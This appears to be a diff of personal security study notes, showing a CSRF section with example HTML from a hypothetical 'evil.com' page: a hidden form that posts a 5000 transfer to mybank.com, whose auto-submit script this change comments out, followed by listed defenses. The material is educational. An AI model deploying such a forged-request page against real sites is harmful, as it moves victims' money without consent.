@@ -795,17 +795,17 @@ Definition: Identify, prioritize and remediate vulnerabilities in your environme
     * If you are stil loggedin to `mybank.com`, the request could succeed because the browser would use any cookies linked to the `mybank.com` site.
     * Example HTMl on the `evil.com` site
     ```html
-    <!-- Hidden on evilsite.com -->
-    <form action="https://mybank.com/transfer" method="POST" id="malicious-form">
-        <input type="hidden" name="to_account" value="999999">
-        <input type="hidden" name="amount" value="5000">
-        <!-- Note: no CSRF token! -->
-    </form>
+        <!-- Hidden on evilsite.com -->
+        <form action="https://mybank.com/transfer" method="POST" id="malicious-form">
+            <input type="hidden" name="to_account" value="999999">
+            <input type="hidden" name="amount" value="5000">
+            <!-- Note: no CSRF token! -->
+        </form>
 
-    <script>
-        // Automatically submit when page loads
-        document.getElementById('malicious-form').submit();
-    </script>
+        <script>
+            // Automatically submit when page loads
+            // document.getElementById('malicious-form').submit();
+        </script>
     ```
     * Defenses: secure tokens, check in reffering url to only accept urls that originate from own domain.
   * **Server-Side Request Forgery SSRF**
